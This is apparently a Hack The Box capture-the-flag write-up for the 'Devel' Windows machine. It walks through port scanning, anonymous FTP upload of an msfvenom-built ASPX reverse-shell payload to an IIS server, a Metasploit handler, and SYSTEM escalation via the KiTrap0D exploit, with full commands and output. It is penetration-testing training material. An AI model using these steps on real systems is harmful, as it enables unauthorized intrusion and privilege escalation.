# Title: Devel
  Date: 2019-10-12

# Enumeration

Kicked things off with a port scan, as per usual:

```
$ nmap -Pn -sV devel
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-11 11:43 CDT
Nmap scan report for devel (10.10.10.5)
Host is up (0.039s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We've got a Windows machine running IIS 7.5 and FTP. 

I first visited the website, and saw this familiar image:

<img src="https://raw.githubusercontent.com/chadpierce/htb/master/devel/welcome.png" alt="welcome" width="400"/>

The next thing I did was kick off Nikto:

```
$ nikto -h http://devel
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.5
+ Target Hostname:    devel
+ Target Port:        80
+ Start Time:         2019-10-11 12:42:55 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 2.0.50727
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ /: Appears to be a default IIS 7 install.
+ 7681 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2019-10-11 12:48:55 (GMT-5) (360 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Which didn't give me much to go on. Then I ran dirb with the IIS wordlist, but didn't really expect much:
 
```
$ dirb http://devel /usr/share/wordlists/dirb/vulns/iis.txt -o devel-dirb-iis.txt
```
That also came up with nothing interesting so I gave up on the webserver and started focusing on FTP. Anonymous login was enabled and I could upload files to the root of the webserver so I suspected this was the way in. This is IIS 7.5 which is over a decade old so there's bound to be some vulnerabilities. Here's what it looked like after I logged in, you can see the files being served by the webserver:

```
$ ftp devel
Connected to devel.
220 Microsoft FTP Service
Name (devel:zxc): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

I uploaded a test.html file successfully and was able to view it via HTTP. 

## Building an ASPX payload to gain shell access

I did a little research and saw that I likely needed to build a payload to upload and then use it to launch a reverse shell. This isn't something I've done much with Metasploit in the past, and it's been a while since I'd played around with it so it took a little time to get right. It sounded like an asp payload might do the trick since this is IIS7.5.  I followed some documentation to use __msvenom__ to build the payload:

Searched for applicable payloads:
```
msfvenom -lp |grep windows/meterpreter
```

I also ran this command to view all of the possible file formats the tool supports:
```
msfvenom --list formats
```

The list is pretty long - I first went with asp, but then learned I'd need to use aspx after a failed attempt. I could have researched IIS7.5 a little more up front to have saved myself the trouble. I'll skip that here and just cut to building the aspx payload:

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -o payload.aspx -f aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 38572 bytes
Saved as: payload.aspx
```

The LHOST and LPORT values are my attack box. This is so the exploit knows where I'm listening when it reaches out to establish a connection. If you view the contents of the output file it contains a lot of gobbledigook. The next step is to upload this file to the webserver via FTP. Then load up msfconsole to start listening:

```
msf5 > use exploit/multi/handler
```

Set LHOST to your local IP (if you check what device your HTB VPN tunnel is using you can set it to that, for example: set lhost tun0). Then set the same payload used in msfvenom payload. 

```
set payload windows/meterpreter/reverse_tcp
```

Then run the handler in metasploit and it should start listening. Go to your browser and load the payload file you uploaded and it should kick off the exploit and give you a meterpreter shell. I was scratching my head for a while here because my aspx script wasn't loading properly until I realized I was loading the file via FTP instead of HTTP. Doh. Once I did it the right way so the script would be interpreted correctly my meterpreter listener got a connection and I got a shell. Cool. 

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.10.10.5:49206) at 2019-10-12 12:53:46 -0500


meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > 
```

Then I launched a shell:

```
meterpreter > shell
Process 3748 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

And ran __systeminfo__ to get more detail on the box:

```
c:\Windows\System32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          15/10/2019, 5:29:29 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 79 Stepping 1 GenuineIntel ~2400 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 691 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.506 MB
Virtual Memory: In Use:    542 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```

This gives more detail on the version of Windows, system specs, plus interesting things like no hotfixes are installed. 

Oh and I also checked to see who I was:

```
c:\Windows>whoami
whoami
iis apppool\web
```

## Getting root

I knew there was a way to search for possible exploits on a machine when using a meterpreter shell, but I wasn't super familiar with how, so a little more research was needed. "local_exploit_suggester" looks at system info like we just viewed and reports back some possible vulnerabilities on the machine that can be leveraged.

```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > show options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set session 3
session => 3
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

There are several possible vulnerabilities we can try. I went through a couple that sounded interesting that gave me nothing until trying __ms10_015_kitrap0d__:

```
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options 

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[-] Exploit failed: Msf::OptionValidateError The following options failed to validate: SESSION.
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options 

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 3
session => 3
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.x.x:5555 
[*] Launching notepad to host the exploit...
[+] Process 3864 launched.
[*] Reflectively injecting the exploit DLL into 3864...
[*] Injecting exploit into 3864 ...
[*] Exploit injected. Injecting payload into 3864...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.x.x:5555 -> 10.10.10.5:49158) at 2019-10-12 21:28:45 -0500

meterpreter > shell
Process 4044 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

c:\windows\system32\inetsrv>
```

The code block above walks though running the exploit once on the wrong meterpreter session. I realized my mistake and then pointed to the correct one, then the exploit worked and I got an "NT Authority" shell. This is basically root in Windows. Note that I also used a different port since 4444 was already in use. 

Here's a little info on the exploit:

```
msf5 exploit(windows/local/ms10_015_kitrap0d) > info windows/local/ms10_015_kitrap0d

       Name: Windows SYSTEM Escalation via KiTrap0D
     Module: exploit/windows/local/ms10_015_kitrap0d
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2010-01-19

Provided by:
  Tavis Ormandy
  HD Moore
  Pusscat
  OJ Reeves

Available targets:
  Id  Name
  --  ----
  0   Windows 2K SP4 - Windows 7 (x86)

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on.

Payload information:

Description:
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.

References:
  https://cvedetails.com/cve/CVE-2010-0232/
  OSVDB (61854)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/MS10-015
  https://www.exploit-db.com/exploits/11199
  https://seclists.org/fulldisclosure/2010/Jan/341
```

Follow the links there at the bottom for some interesting reading that will glaze your eyes over. Anyway, I was able to find both user and root flags in their respective Desktop directories. Done.
